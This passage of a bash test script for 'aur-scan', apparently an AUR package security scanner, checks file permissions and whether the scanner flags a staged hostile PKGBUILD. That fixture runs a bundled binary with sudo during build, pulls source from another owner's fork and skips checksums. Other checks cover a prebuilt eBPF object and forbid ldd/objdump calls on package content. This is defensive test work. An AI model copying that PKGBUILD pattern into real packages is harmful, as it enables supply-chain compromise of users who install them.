PERM=$(stat -c '%a' /tmp/acc-cache/aur-scan/history 2>/dev/null)
[[ $PERM == "700" ]] && pass "history dir is 0700 (got $PERM)" || fail "history dir mode is $PERM, expected 700"
PERM=$(stat -c '%a' /tmp/acc-cache/aur-scan/history/local/difftool.json 2>/dev/null)
[[ $PERM == "600" ]] && pass "history record is 0600 (got $PERM)" || fail "history record mode is $PERM, expected 600"
# No temp files left behind.
LEFT=$(find /tmp/acc-cache/aur-scan/history -name '*.tmp*' 2>/dev/null | wc -l)
[[ ${LEFT:-0} -eq 0 ]] && pass "no temp files left in the history store" || fail "$LEFT temp file(s) left behind"
unset XDG_CACHE_HOME

sect "Binary / ELF analysis (issue #29) - static, nothing executed"
# Uses a REAL system binary as the payload, generated at run time rather than
# committed: a security scanner should not carry an executable in its own repo.
rm -rf /tmp/bin29 && mkdir -p /tmp/bin29
cp /usr/bin/curl /tmp/bin29/validator
cat > /tmp/bin29/PKGBUILD <<'PKG'
pkgname=openconnect-sso
pkgver=0.8.1
pkgrel=1
arch=('x86_64')
url="https://github.com/vlaci/openconnect-sso"
source=("git+https://github.com/PrestonHager/openconnect-sso.git" "validator")
sha256sums=('SKIP' 'SKIP')
build() {
  cd openconnect-sso
  sudo ../validator --check
  python setup.py build
}
PKG
OUT=$(aur-scan scan /tmp/bin29 --format json 2>/dev/null)
# All four red flags from the original report.
grep -q '"BIN-002"'  <<<"$OUT" && pass "bundled binary executed during build (BIN-002)"     || fail "BIN-002 missing"
grep -q '"SRC-010"'  <<<"$OUT" && pass "source is a different owner's fork (SRC-010)"       || fail "SRC-010 missing"
grep -q '"PRIV-001"' <<<"$OUT" && pass "sudo in build (PRIV-001)"                           || fail "PRIV-001 missing"
grep -q '"CHK-005"'  <<<"$OUT" && pass "no real checksums (CHK-005)"                        || fail "CHK-005 missing"
# The capability evidence the original report described, read from SYMBOLS.
python3 -c '
import json,sys
f=[x for x in json.load(sys.stdin)["findings"] if x["id"]=="BIN-002"][0]
assert f["severity"]=="critical", f["severity"]
assert f["metadata"]["network_symbols"], "should report network capability"
' <<<"$OUT" && pass "BIN-002 is Critical and reports network capability from symbols"              || fail "BIN-002 severity/metadata wrong"

# An eBPF object -- the Atomic Arch delivery shape.
rm -rf /tmp/binbpf && mkdir -p /tmp/binbpf
printf '\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\xf7\x00' > /tmp/binbpf/scales.bpf.o
head -c 48 /dev/zero >> /tmp/binbpf/scales.bpf.o
cat > /tmp/binbpf/PKGBUILD <<'PKG'
pkgname=bpf-pkg
pkgver=1.0
pkgrel=1
arch=('x86_64')
PKG
grep_ok "prebuilt eBPF object is flagged (BIN-003)" "BIN-003" aur-scan scan /tmp/binbpf --format json

# Static-only invariant: the scanner must never invoke ldd/objdump on package
# content. ldd is a shell script that eval-executes its target through the
# loader, so calling it on a hostile -bin payload runs that payload.
if grep -rnE '"(ldd|objdump|readelf|nm)"' "$SRC/crates" --include='*.rs' | grep -v '^.*tests\?/' | grep -q .; then
    fail "the scanner shells out to a binutils/ldd helper on package content"
else
    pass "no ldd/objdump/readelf/nm invocation anywhere in the crates"
fi

# False positives: ordinary packages must produce no BIN-* at all.
for d in "$SRC"/tests/fixtures/clean/*/; do
    n=$(aur-scan scan "$d" --format json 2>/dev/null | python3 -c '
import json,sys; print(len([f for f in json.load(sys.stdin)["findings"] if f["id"].startswith("BIN-")]))' 2>/dev/null)
    [[ ${n:-1} -eq 0 ]] && pass "clean/$(basename "$d") -> no BIN findings" || fail "clean/$(basename "$d") -> $n BIN findings"
done

sect "Result"
printf '  %d passed, %d failed\n' "$PASSN" "$FAIL"
[[ $FAIL -eq 0 ]] && echo "  ALL CHECKS PASSED" || echo "  SOME CHECKS FAILED"
exit $((FAIL > 0))
